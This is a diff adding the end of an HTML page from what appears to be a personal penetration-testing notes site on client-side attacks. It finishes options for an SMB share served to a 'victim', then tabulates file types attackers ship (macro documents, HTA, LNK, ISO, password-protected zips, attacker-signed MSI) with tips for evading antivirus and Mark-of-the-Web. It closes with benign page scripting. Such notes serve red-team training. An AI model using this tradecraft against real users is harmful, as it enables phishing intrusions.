+<li><code>-smb2support</code> — accept SMB2 clients (Windows 10+ won't fall back to SMB1)</li>
+<li>first positional (<code>share</code>) — the share name victim sees</li>
+<li>second positional (<code>$(pwd)</code>) — local path to serve</li>
+</ul>
+<hr />
+<h2 id="common-client-side-extensions-attackers-ship">Common Client-Side Extensions Attackers Ship</h2>
+<table>
+<thead>
+<tr>
+<th>Extension</th>
+<th>Trigger</th>
+<th>Notes</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>.docm</code> / <code>.doc</code></td>
+<td>VBA on open</td>
+<td>Section above</td>
+</tr>
+<tr>
+<td><code>.xlsm</code> / <code>.xls</code></td>
+<td>VBA <code>Auto_Open()</code></td>
+<td>Same VBA trick, different hook</td>
+</tr>
+<tr>
+<td><code>.hta</code></td>
+<td><code>mshta.exe</code></td>
+<td>Section above</td>
+</tr>
+<tr>
+<td><code>.lnk</code></td>
+<td>double-click</td>
+<td>Section above (via <code>.Library-ms</code> or ISO)</td>
+</tr>
+<tr>
+<td><code>.iso</code> / <code>.img</code></td>
+<td>mounts as drive</td>
+<td>MOTW lost; drop <code>.lnk</code> inside</td>
+</tr>
+<tr>
+<td><code>.zip</code> (password)</td>
+<td>AV can't scan</td>
+<td>Drop any of the above inside</td>
+</tr>
+<tr>
+<td><code>.pdf</code></td>
+<td>Foxit/Acrobat JS or embedded EXE</td>
+<td>Fewer live paths today</td>
+</tr>
+<tr>
+<td><code>.chm</code></td>
+<td>mshta-style, deprecated</td>
+<td>Still runs on legacy hosts</td>
+</tr>
+<tr>
+<td><code>.msi</code></td>
+<td>Installer with <code>CustomAction</code></td>
+<td>Signed by attacker cert = trusted UI</td>
+</tr>
+<tr>
+<td><code>.svg</code></td>
+<td>Inline <code>&lt;script&gt;</code> in modern renderers</td>
+<td>Foothold via SVG</td>
+</tr>
+</tbody>
+</table>
+</main>
+
+<footer class="site">
+  <div class="wrap foot">
+    <div class="f-brand"><b>corey.clay</b> — other / client-side attacks · <span id="year"></span></div>
+    <div class="foot-links">
+      <a href="other.html">other</a>
+      <a href="index.html">home</a>
+      <a href="https://github.com/Ac3xRaid3r" target="_blank" rel="noopener">github</a>
+      <a href="#top">top</a>
+    </div>
+  </div>
+</footer>
+
+<script>
+(function(){
+  "use strict";
+  var y=document.getElementById('year'); if(y) y.textContent=new Date().getFullYear();
+
+  document.querySelectorAll('main table').forEach(function(t){
+    if(t.parentElement.classList.contains('table-scroll')) return;
+    var w=document.createElement('div'); w.className='table-scroll';
+    t.parentNode.insertBefore(w,t); w.appendChild(t);
+  });
+
+  document.querySelectorAll('main pre').forEach(function(pre){
+    var wrap=document.createElement('div'); wrap.className='code-wrap';
+    pre.parentNode.insertBefore(wrap,pre); wrap.appendChild(pre);
+    var btn=document.createElement('button');
+    btn.className='copy'; btn.type='button'; btn.textContent='copy';
+    btn.setAttribute('aria-label','Copy to clipboard');
+    btn.addEventListener('click',function(){
+      var text=pre.innerText;
+      var done=function(){btn.textContent='copied';btn.classList.add('done');
+        setTimeout(function(){btn.textContent='copy';btn.classList.remove('done');},1400);};
+      if(navigator.clipboard&&navigator.clipboard.writeText){
+        navigator.clipboard.writeText(text).then(done).catch(function(){fb(text,done);});
+      } else {fb(text,done);}
+    });
+    wrap.appendChild(btn);
+  });
+  function fb(text,cb){var ta=document.createElement('textarea');ta.value=text;
+    ta.style.position='fixed';ta.style.opacity='0';document.body.appendChild(ta);ta.select();
+    try{document.execCommand('copy');cb();}catch(e){}document.body.removeChild(ta);}
+
+  var navLinks=Array.prototype.slice.call(document.querySelectorAll('.sec-nav a'));
+  if(navLinks.length){
+    var map={}; navLinks.forEach(function(a){map[a.getAttribute('href').slice(1)]=a;});
+    var heads=Array.prototype.slice.call(document.querySelectorAll('main h2[id]'));
+    var obs=new IntersectionObserver(function(entries){
+      entries.forEach(function(e){
+        if(e.isIntersecting){
+          navLinks.forEach(function(a){a.classList.remove('here');});
+          var a=map[e.target.id];
+          if(a){a.classList.add('here');var ic=a.parentElement;if(ic&&ic.scrollWidth>ic.clientWidth){ic.scrollTo({left:a.offsetLeft-ic.clientWidth/2+a.offsetWidth/2,behavior:'smooth'});}}
+        }
+      });
+    },{rootMargin:'-130px 0px -70% 0px',threshold:0});
+    heads.forEach(function(h){obs.observe(h);});
+  }
+})();
+</script>
+</body>
+</html>
